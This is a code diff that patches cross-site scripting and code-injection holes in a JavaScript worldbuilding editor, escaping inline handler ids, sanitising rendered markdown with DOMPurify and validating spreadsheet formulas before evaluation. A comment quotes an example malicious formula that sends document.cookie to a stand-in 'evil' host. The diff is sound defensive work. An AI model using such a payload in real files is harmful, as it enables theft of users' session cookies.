@@ -4211,7 +4211,7 @@ function renderGlossaryWords()
       '<div class="gls-letter-divider">' + escHtml(letter) + '</div>' +
       groups[letter].map(function(e){
         var lc  = glsLangColor(e.language);
-        return '<div class="gls-entry-card" style="--lang-color:' + lc + '" onclick="openGlossaryEntryModal(\'' + e.id + '\')">' +
+        return '<div class="gls-entry-card" style="--lang-color:' + lc + '" onclick="openGlossaryEntryModal(\'' + escAttr(e.id) + '\')">' +
           '<div class="gls-entry-left">' +
             '<div class="gls-entry-word">' + escHtml(e.word||'') + '</div>' +
             (e.language ? '<span class="gls-lang-badge" style="background:' + lc + '22;color:' + lc + ';border-color:' + lc + '44">' + escHtml(e.language) + '</span>' : '') +
@@ -4221,7 +4221,7 @@ function renderGlossaryWords()
             (e.example ? '<div class="gls-entry-ex">"' + escHtml(e.example) + '"</div>' : '') +
             tagChipsHtml(e.tags, 'glsFilterByTag') +
           '</div>' +
-          '<button class="gls-card-del" onclick="deleteGlossaryEntry(event,\'' + e.id + '\')">×</button>' +
+          '<button class="gls-card-del" onclick="deleteGlossaryEntry(event,\'' + escAttr(e.id) + '\')">×</button>' +
         '</div>';
       }).join('') +
     '</div>';
@@ -4249,13 +4249,13 @@ function renderGlossaryRoots()
   document.getElementById('gls-roots-body').innerHTML = rows.map(function(r){
     var tc = ROOT_TYPE_COLORS[r.type] || '#9ca3af';
     var exs = (r.examples||[]).map(function(ex){ return '<span class="gls-tag">' + escHtml(ex) + '</span>'; }).join('');
-    return '<div class="gls-root-card" onclick="openGlossaryRootModal(\'' + r.id + '\')">' +
+    return '<div class="gls-root-card" onclick="openGlossaryRootModal(\'' + escAttr(r.id) + '\')">' +
       '<div class="gls-root-form">' + escHtml(r.form||'') + '</div>' +
       '<span class="gls-root-type" style="background:' + tc + '22;color:' + tc + ';border-color:' + tc + '55">' + escHtml(r.type||'root') + '</span>' +
       '<div class="gls-root-meaning">' + escHtml(r.meaning||'') + '</div>' +
       (exs ? '<div class="gls-root-examples">' + exs + '</div>' : '') +
       tagChipsHtml(r.tags, 'glsFilterByTag') +
-      '<button class="gls-card-del" onclick="deleteGlossaryRoot(event,\'' + r.id + '\')">×</button>' +
+      '<button class="gls-card-del" onclick="deleteGlossaryRoot(event,\'' + escAttr(r.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 }
@@ -4446,7 +4446,7 @@ function renderBestiary()
       '<div class="gls-letter-divider" style="color:' + cc + '">' + escHtml(cat) + '</div>' +
       groups[cat].map(function(b){
         var abilities = (b.abilities||[]).map(function(a){ return '<span class="gls-tag">' + escHtml(a) + '</span>'; }).join('');
-        return '<div class="bst-card" onclick="openBeastModal(\'' + b.id + '\')">' +
+        return '<div class="bst-card" onclick="openBeastModal(\'' + escAttr(b.id) + '\')">' +
           '<div class="bst-card-head">' +
             '<div class="bst-name">' + escHtml(b.commonName || b.name || '') +
               (b.commonName && b.name ? ' <span class="bst-sci-name">' + escHtml(b.name) + '</span>' : '') +
@@ -4458,7 +4458,7 @@ function renderBestiary()
           (b.description ? '<div class="bst-desc">' + escHtml(b.description) + '</div>' : '') +
           (abilities ? '<div class="bst-abilities">' + abilities + '</div>' : '') +
           tagChipsHtml(b.tags, 'bstFilterByTag') +
-          '<button class="gls-card-del" onclick="deleteBeast(event,\'' + b.id + '\')">×</button>' +
+          '<button class="gls-card-del" onclick="deleteBeast(event,\'' + escAttr(b.id) + '\')">×</button>' +
         '</div>';
       }).join('') +
     '</div>';
@@ -4629,7 +4629,7 @@ function renderCalendarMonths()
           var pct    = ((m.days||0) / totalDays * 100).toFixed(2);
           var hols   = (calData.holidays||[]).filter(function(h){ return h.monthId === m.id; });
           var dots   = hols.map(function(h){ return '<span class="cal-tl-hol" title="' + escAttr(h.name||'') + '" style="left:' + ((h.day||1)/(m.days||30)*100).toFixed(1) + '%"></span>'; }).join('');
-          return '<div class="cal-tl-seg" style="width:' + pct + '%;background:' + escAttr(color) + '" title="' + escAttr(m.name||'') + ' · ' + (m.days||0) + ' days" onclick="openCalendarMonthModal(\'' + m.id + '\')">' +
+          return '<div class="cal-tl-seg" style="width:' + pct + '%;background:' + escAttr(color) + '" title="' + escAttr(m.name||'') + ' · ' + (m.days||0) + ' days" onclick="openCalendarMonthModal(\'' + escAttr(m.id) + '\')">' +
             '<span class="cal-tl-name">' + escHtml(m.name||'') + '</span>' +
             dots +
           '</div>';
@@ -4644,11 +4644,11 @@ function renderCalendarMonths()
   strip.innerHTML = seasons.map(function(s){
     var days = calSeasonDays(s);
     var mcount = (s.monthIds||[]).length;
-    return '<div class="cal-season-chip" style="--season-color:' + escAttr(s.color||'#888') + '" onclick="openCalendarSeasonModal(\'' + s.id + '\')">' +
+    return '<div class="cal-season-chip" style="--season-color:' + escAttr(s.color||'#888') + '" onclick="openCalendarSeasonModal(\'' + escAttr(s.id) + '\')">' +
       '<span class="cal-season-dot" style="background:' + escAttr(s.color||'#888') + '"></span>' +
       '<span class="cal-season-name">' + escHtml(s.name||'') + '</span>' +
       '<span class="cal-season-meta">' + mcount + (mcount===1?' month':' months') + (days ? ' · ' + days + ' days' : '') + '</span>' +
-      '<button class="gls-card-del" style="margin-left:4px" onclick="deleteCalendarSeason(event,\'' + s.id + '\')">×</button>' +
+      '<button class="gls-card-del" style="margin-left:4px" onclick="deleteCalendarSeason(event,\'' + escAttr(s.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 
@@ -4684,7 +4684,7 @@ function renderCalendarMonths()
     var holHtml = hols.map(function(h){
       return '<div class="cal-month-hol"><span class="cal-hol-dot" style="background:' + escAttr(sColor) + '"></span>' + escHtml(h.name||'') + ' <span class="cal-hol-day">day ' + (h.day||'?') + '</span></div>';
     }).join('');
-    return '<div class="cal-month-card" style="--season-color:' + escAttr(sColor) + '" onclick="openCalendarMonthModal(\'' + m.id + '\')">' +
+    return '<div class="cal-month-card" style="--season-color:' + escAttr(sColor) + '" onclick="openCalendarMonthModal(\'' + escAttr(m.id) + '\')">' +
       '<div class="cal-month-header">' +
         '<span class="cal-month-name">' + escHtml(m.name||'') + '</span>' +
         '<span class="cal-month-days-badge">' + (m.days||'?') + '</span>' +
@@ -4694,7 +4694,7 @@ function renderCalendarMonths()
       dotHtml +
       tagChipsHtml(m.tags, 'calFilterByTag') +
       (holHtml ? '<div class="cal-month-hols">' + holHtml + '</div>' : '') +
-      '<button class="gls-card-del cal-card-del" onclick="deleteCalendarMonth(event,\'' + m.id + '\')">×</button>' +
+      '<button class="gls-card-del cal-card-del" onclick="deleteCalendarMonth(event,\'' + escAttr(m.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 }
@@ -4731,7 +4731,7 @@ function renderCalendarHolidays()
     var season = month ? (calData.seasons||[]).find(function(s){ return (s.monthIds||[]).includes(month.id); }) : null;
     var sc     = season ? season.color : '#9ca3af';
     var tc     = HOL_TYPE_COLORS[h.type] || '#9ca3af';
-    return '<div class="cal-hol-card" onclick="openCalendarHolidayModal(\'' + h.id + '\')">' +
+    return '<div class="cal-hol-card" onclick="openCalendarHolidayModal(\'' + escAttr(h.id) + '\')">' +
       '<div class="cal-hol-marker" style="background:' + escAttr(sc) + '"></div>' +
       '<div class="cal-hol-body">' +
         '<div class="cal-hol-title">' +
@@ -4744,7 +4744,7 @@ function renderCalendarHolidays()
         (h.description ? '<div class="cal-hol-desc">' + escHtml(h.description) + '</div>' : '') +
         tagChipsHtml(h.tags, 'calFilterByTag') +
       '</div>' +
-      '<button class="gls-card-del" onclick="deleteCalendarHoliday(event,\'' + h.id + '\')">×</button>' +
+      '<button class="gls-card-del" onclick="deleteCalendarHoliday(event,\'' + escAttr(h.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 }
@@ -5069,14 +5069,14 @@ function renderEcoCurrencies()
     var c = x.c;
     var color = ecoCurrColor(x.i);
     var isBase = (x.i === 0);
-    return '<div class="eco-curr-card" onclick="openEcoCurrencyModal(\'' + c.id + '\')">' +
+    return '<div class="eco-curr-card" onclick="openEcoCurrencyModal(\'' + escAttr(c.id) + '\')">' +
       '<div class="eco-curr-symbol" style="color:' + color + ';border-color:' + color + '44">' + escHtml(c.symbol||'?') + '</div>' +
       '<div class="eco-curr-name">' + escHtml(c.name||'') + '</div>' +
       (c.region ? '<div class="eco-curr-region">' + escHtml(c.region) + '</div>' : '') +
       '<div class="eco-curr-value">' + (isBase ? 'Base currency' : '×' + (c.baseValue||1)) + '</div>' +
       (c.description ? '<div class="eco-curr-desc">' + escHtml(c.description) + '</div>' : '') +
       tagChipsHtml(c.tags, 'ecoFilterByTag') +
-      '<button class="gls-card-del" onclick="deleteEcoCurrency(event,\'' + c.id + '\')">×</button>' +
+      '<button class="gls-card-del" onclick="deleteEcoCurrency(event,\'' + escAttr(c.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 
@@ -5109,13 +5109,13 @@ function renderEcoGoods()
     var cur = (ecoData.currencies||[]).find(function(c){ return c.id === g.priceCurrencyId; });
     var price = g.priceAmount != null ? g.priceAmount + (cur ? ' ' + escHtml(cur.symbol) : '') : '';
     var cc = ecoCatColor(g.category);
-    return '<tr class="data-row" onclick="openEcoGoodModal(\'' + g.id + '\')">' +
+    return '<tr class="data-row" onclick="openEcoGoodModal(\'' + escAttr(g.id) + '\')">' +
       '<td class="eco-good-name">' + escHtml(g.name||'') + tagChipsHtml(g.tags, 'ecoFilterByTag') + '</td>' +
       '<td>' + (g.category ? '<span class="eco-cat-badge" style="background:' + cc + '22;color:' + cc + ';border-color:' + cc + '44">' + escHtml(g.category) + '</span>' : '') + '</td>' +
       '<td class="eco-price-cell">' + escHtml(price) + '</td>' +
       '<td class="eco-origin-cell">' + escHtml(g.origin||'') + '</td>' +
       '<td class="eco-desc-cell">' + escHtml(g.description||'') + '</td>' +
-      '<td><button class="gls-card-del" onclick="deleteEcoGood(event,\'' + g.id + '\')">×</button></td>' +
+      '<td><button class="gls-card-del" onclick="deleteEcoGood(event,\'' + escAttr(g.id) + '\')">×</button></td>' +
     '</tr>';
   }).join('');
 }
@@ -5134,7 +5134,7 @@ function renderEcoRegions()
     var sc   = ECO_STATUS_COLORS[r.economicStatus] || '#9ca3af';
     var exps = (r.exports||[]).map(function(e){ return '<span class="eco-trade-chip eco-export-chip">' + escHtml(e) + '</span>'; }).join('');
     var imps = (r.imports||[]).map(function(e){ return '<span class="eco-trade-chip eco-import-chip">' + escHtml(e) + '</span>'; }).join('');
-    return '<div class="eco-region-card" onclick="openEcoRegionModal(\'' + r.id + '\')">' +
+    return '<div class="eco-region-card" onclick="openEcoRegionModal(\'' + escAttr(r.id) + '\')">' +
       '<div class="eco-region-header">' +
         '<span class="eco-region-name">' + escHtml(r.name||'') + '</span>' +
         (r.economicStatus ? '<span class="eco-status-badge" style="background:' + sc + '22;color:' + sc + ';border-color:' + sc + '44">' + escHtml(r.economicStatus) + '</span>' : '') +
@@ -5144,7 +5144,7 @@ function renderEcoRegions()
       (imps ? '<div class="eco-region-trade"><span class="eco-trade-label">Imports</span>' + imps + '</div>' : '') +
       (r.notes ? '<div class="eco-region-notes">' + escHtml(r.notes) + '</div>' : '') +
       tagChipsHtml(r.tags, 'ecoFilterByTag') +
-      '<button class="gls-card-del" onclick="deleteEcoRegion(event,\'' + r.id + '\')">×</button>' +
+      '<button class="gls-card-del" onclick="deleteEcoRegion(event,\'' + escAttr(r.id) + '\')">×</button>' +
     '</div>';
   }).join('');
 }
@@ -6077,7 +6077,7 @@ function updatePreview()
   }
 
   var previewContent = document.getElementById('preview-content');
-  previewContent.innerHTML = html;
+  previewContent.innerHTML = sanitizeHtml(html);
   renderMermaidDiagrams(previewContent);
   renderEmbeddedSheetCharts(previewContent);
   renderPreviewBacklinks();
@@ -7316,7 +7316,7 @@ function updateGraphPreview()
 
   var container = document.getElementById('graph-preview-content');
 
-  container.innerHTML = html;
+  container.innerHTML = sanitizeHtml(html);
 
   renderMermaidDiagrams(container);
 }
@@ -12599,12 +12599,55 @@ function substituteCellRefs(exprText)
   );
 }
 
+// Last line of defence before the JS evaluator. Formulas are a JS-expression
+// dialect (numbers, strings, the arithmetic/comparison/logical operators,
+// ternaries), so by the time an expression reaches Function() every cell ref
+// and named function should already be resolved to a literal. Anything else -
+// a bare identifier like `fetch`, `document`, `constructor`, or a stray `[`,
+// backtick, or `\` - means untrusted text survived substitution, and must
+// never be handed to Function(): a shared .mds could otherwise smuggle
+// `=fetch('//evil/'+document.cookie)` through as running JavaScript. We strip
+// string and numeric literals (which are data, and may legitimately contain
+// letters like the `e` in `1e5`), then reject any remaining identifier that
+// isn't a boolean literal, and any character outside the operator set.
+function assertSafeEvalExpr(expr)
+{
+  var stripped = String(expr)
+    .replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, ' ')          // string literals
+    .replace(/\b0[xX][0-9a-fA-F]+\b/g, ' ')                         // hex numbers
+    .replace(/(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?/g, ' ');         // decimal / scientific
+
+  var idRe = /[A-Za-z_$][A-Za-z0-9_$]*/g,
+      m;
+
+  while ((m = idRe.exec(stripped)))
+  {
+    if (m[0] !== 'true' && m[0] !== 'false')
+      throw new Error('disallowed identifier in formula: ' + m[0]);
+  }
+
+  var leftover = stripped.replace(/true|false/g, ' ');
+
+  // Allowed: whitespace, arithmetic/comparison/logical/bitwise operators,
+  // ternary, grouping, and the argument comma. Notably NOT: [ ] { } ` \ ; @ #.
+  if (/[^\s+\-*/%<>=!&|^~?:().,]/.test(leftover))
+    throw new Error('disallowed character in formula');
+}
+
+// Validates then evaluates a fully-substituted expression. Every path that
+// feeds assembled formula text to Function() goes through here.
+function evalFinalExpr(expr)
+{
+  assertSafeEvalExpr(expr);
+  return Function('"use strict"; return (' + expr + ')')();
+}
+
 // Evaluates a flat (no nested parens) sub-expression like "A3-A4" or "5*2",
 // resolving any cell references first - used as the argument to scalar
 // functions such as ABS/ROUND/SQRT/IF/etc.
 function resolveValue(exprText)
 {
-  return Function('"use strict"; return (' + sanitizeExprForEval(substituteCellRefs(exprText)) + ')')();
+  return evalFinalExpr(sanitizeExprForEval(substituteCellRefs(exprText)));
 }
 
 // Resolves innermost parenthesis groups that are NOT function calls (the
@@ -13927,7 +13970,7 @@ function evalCell(ref, val)
 
     expr = sanitizeExprForEval(substituteCellRefs(expr));
 
-    var result = Function('"use strict"; return (' + expr + ')')();
+    var result = evalFinalExpr(expr);
 
     if (typeof result === 'boolean')
       out = result ? 'TRUE' : 'FALSE';
@@ -15082,20 +15125,20 @@ function renderSheetCharts()
     box.style.height = chartDef.height + 'px';
 
     var swapBtn = chartDef.type === 'scatter' ? '' :
-        '<span class="sheet-chart-del" title="Swap legend and axis (rows ↔ columns)" onmousedown="event.stopPropagation()" onclick="toggleChartOrientation(event,\'' + chartDef.id + '\')">' +
+        '<span class="sheet-chart-del" title="Swap legend and axis (rows ↔ columns)" onmousedown="event.stopPropagation()" onclick="toggleChartOrientation(event,\'' + escAttr(chartDef.id) + '\')">' +
           '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17,3 21,7 17,11"/><line x1="21" y1="7" x2="9" y2="7"/><polyline points="7,13 3,17 7,21"/><line x1="3" y1="17" x2="15" y2="17"/></svg>' +
         '</span>';
 
     box.innerHTML =
-      '<div class="sheet-chart-header" onmousedown="chartBoxMouseDown(event,\'' + chartDef.id + '\')">' +
+      '<div class="sheet-chart-header" onmousedown="chartBoxMouseDown(event,\'' + escAttr(chartDef.id) + '\')">' +
         '<span class="sheet-chart-title">' + escHtml(chartDef.title || 'Chart') + '</span>' +
         swapBtn +
-        '<span class="sheet-chart-del" onmousedown="event.stopPropagation()" onclick="deleteChart(event,\'' + chartDef.id + '\')">' +
+        '<span class="sheet-chart-del" onmousedown="event.stopPropagation()" onclick="deleteChart(event,\'' + escAttr(chartDef.id) + '\')">' +
           '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>' +
         '</span>' +
       '</div>' +
       '<div class="sheet-chart-canvas-wrap"><canvas></canvas></div>' +
-      '<div class="sheet-chart-resize-handle" onmousedown="chartResizeMouseDown(event,\'' + chartDef.id + '\')"></div>';
+      '<div class="sheet-chart-resize-handle" onmousedown="chartResizeMouseDown(event,\'' + escAttr(chartDef.id) + '\')"></div>';
 
     layer.appendChild(box);
 
@@ -16986,7 +17029,7 @@ function buildDocExportHtml(file)
     bodyHtml = marked.parser(tokens);
   }
 
-  return wrapExportHtml(file.name, '<h1>' + escHtml(file.name) + '</h1>\n' + bodyHtml);
+  return wrapExportHtml(file.name, '<h1>' + escHtml(file.name) + '</h1>\n' + sanitizeHtml(bodyHtml));
 }
 
 function buildSheetExportHtml(file)
@@ -17090,7 +17133,7 @@ async function buildGraphExportHtml(file)
   if (typeof marked !== 'undefined')
     bodyHtml = marked.parser(marked.lexer(file.content || ''));
 
-  bodyHtml = await inlineMermaidSvgs(bodyHtml);
+  bodyHtml = await inlineMermaidSvgs(sanitizeHtml(bodyHtml));
 
   return wrapExportHtml(file.name, '<h1>' + escHtml(file.name) + '</h1>\n' + bodyHtml);
 }
@@ -17280,6 +17323,22 @@ function escHtml(s)
 function escAttr(s)
 {
   return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;');
+}
+
+// Central sanitizer for HTML produced from document content (markdown
+// preview, graph preview, export bodies). marked's html renderer passes raw
+// HTML through untouched, so a shared file can carry <img onerror=...> or a
+// <script> - every innerHTML sink for rendered markdown must go through
+// here. Own-renderer output (KaTeX spans/MathML, .mermaid divs, checkbox
+// inputs with data-idx, data-chart-config attributes) survives DOMPurify's
+// default profile. If the vendored sanitizer somehow didn't load, fall back
+// to escaping everything: a plain-text preview beats running untrusted markup.
+function sanitizeHtml(html)
+{
+  if (typeof DOMPurify !== 'undefined' && DOMPurify.isSupported)
+    return DOMPurify.sanitize(html);
+
+  return escHtml(html);
 }
 
 
